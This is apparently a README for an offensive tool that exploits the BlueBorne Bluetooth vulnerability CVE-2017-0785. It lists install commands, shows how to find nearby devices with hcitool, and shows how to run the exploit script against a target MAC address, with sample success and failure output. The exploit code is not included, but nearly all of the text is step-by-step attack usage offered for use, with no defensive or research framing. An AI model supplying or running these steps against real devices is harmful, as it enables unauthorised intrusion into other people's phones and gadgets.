# BlueBorn
CVE-2017-0785


## Archlinux installation

paru -S python-pybluez-git bluez-utils-compat pyhton3 python3-pip

sudo pip install pwn

## TUTORIALS

### Discovery

    hcitool scan
    Scanning ...
          XX:XX:XX:XX:XX:XX       Device 1
          XX:XX:XX:XX:XX:XX       Device 2

### Use the exploit

    python CVE-2017-0785.py TARGET=XX:XX:XX:XX:XX
    
    [V] Exploit: Done!


     python CVE-2017-0785.py TARGET=XX:XX:XX:XX:XX ==> FAILED EXEMPLE
  
    [◒] Exploit: Connecting to target
  
    Traceback (most recent call last):
  
    File "<string>", line 3, in connect
  
    _bluetooth.error: (110, 'Connection timed out')

    During handling of the above exception, another exception occurred:

    Traceback (most recent call last):
  
    File "/opt/Hacking-tools/Bluetooth/CVE-2017-0785/CVE-2017-0785.py", line 31, in <module>
    
      sock.connect((target, 1))
    
    File "<string>", line 5, in connect
  
    bluetooth.btcommon.BluetoothError: [Errno 110] Connection timed out
